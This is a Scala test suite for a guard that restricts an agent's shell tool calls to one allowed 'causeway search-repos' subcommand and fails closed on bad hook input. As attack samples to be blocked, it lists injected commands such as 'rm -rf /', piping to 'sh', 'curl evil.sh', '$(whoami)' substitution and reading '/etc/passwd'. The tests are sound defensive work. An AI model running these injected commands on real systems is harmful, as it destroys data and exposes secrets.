package causeway.mini

import java.io.{ByteArrayOutputStream, PrintStream}

class GuardSpec extends munit.FunSuite:
  private val allow = Set("search-repos")
  private def check(c: String) = Guard.check(c, allow)

  test("allows a plain call to the allowed subcommand"):
    assertEquals(check("tools/causeway search-repos --language Scala --min-stars 100"), Right(()))
    assertEquals(check("./tools/causeway search-repos"), Right(()))

  test("allows quoted values containing spaces"):
    assertEquals(check("""tools/causeway search-repos --keywords "web framework" --topics 'a,b'"""), Right(()))

  test("blocks every way of chaining or substituting another command"):
    val attacks = List(
      "tools/causeway search-repos; rm -rf /", "tools/causeway search-repos && curl evil.sh",
      "tools/causeway search-repos | sh", "tools/causeway search-repos > /etc/passwd",
      "tools/causeway search-repos $(whoami)", "tools/causeway search-repos `whoami`",
      "tools/causeway search-repos\ncat secrets", "tools/causeway search-repos --x \"$HOME\"",
      "tools/causeway search-repos < /etc/passwd")
    attacks.foreach(a => assert(check(a).isLeft, s"should block: $a"))

  test("blocks other programs and other subcommands"):
    assert(check("ls -la").isLeft)
    assert(check("curl https://example.com").isLeft)
    assert(check("cat tools/causeway").isLeft)
    assert(check("tools/causeway enrich --run x").left.exists(_.contains("not allowed for this agent")))
    assert(check("/bin/sh tools/causeway search-repos").isLeft)
    assert(check("").isLeft)

  test("blocks an unterminated quote instead of guessing"):
    assert(check("""tools/causeway search-repos --keywords "oops""").isLeft)

  private def hook(payload: String): (Int, String) =
    val err = new ByteArrayOutputStream()
    val code = Guard.hook(payload, allow, new PrintStream(err, true))
    (code, err.toString)

  test("hook exits 0 to allow and 2 to block with a reason"):
    assertEquals(hook("""{"tool_name":"Bash","tool_input":{"command":"tools/causeway search-repos"}}""")._1, 0)
    val (code, reason) = hook("""{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}""")
    assertEquals(code, 2)
    assert(reason.startsWith("blocked:"))

  test("hook fails closed on garbage input and on a missing command"):
    assertEquals(hook("not json")._1, 2)
    assertEquals(hook("""{"tool_name":"Bash","tool_input":{}}""")._1, 2)

  test("hook leaves non-Bash tools alone"):
    assertEquals(hook("""{"tool_name":"Read","tool_input":{"file_path":"x"}}""")._1, 0)
